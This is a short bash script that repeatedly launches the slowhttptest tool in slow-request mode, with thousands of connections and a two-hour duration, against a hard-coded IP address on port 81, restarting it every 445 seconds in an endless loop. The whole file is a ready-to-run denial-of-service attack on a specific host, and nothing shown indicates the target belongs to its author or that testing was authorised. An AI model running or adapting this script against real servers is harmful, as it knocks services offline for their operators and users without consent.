#!/bin/bash

#cmd=$1
#t=$2

while true; do
  slowhttptest -c 4090 -B -i 35 -r 6 -s 8192 -t FAKEVERB -u http://150.165.202.168:81/ -x 10 -p 5 -l 7200 &
  #pid=$!
  pid=`/bin/ps -fu $USER| grep "slowhttptest" | grep -v "grep" | awk '{print $2}'`
  echo "pid: $pid"
  sleep 445
  killall -s SIGTERM slowhttptest
  #kill -15 $pid
done
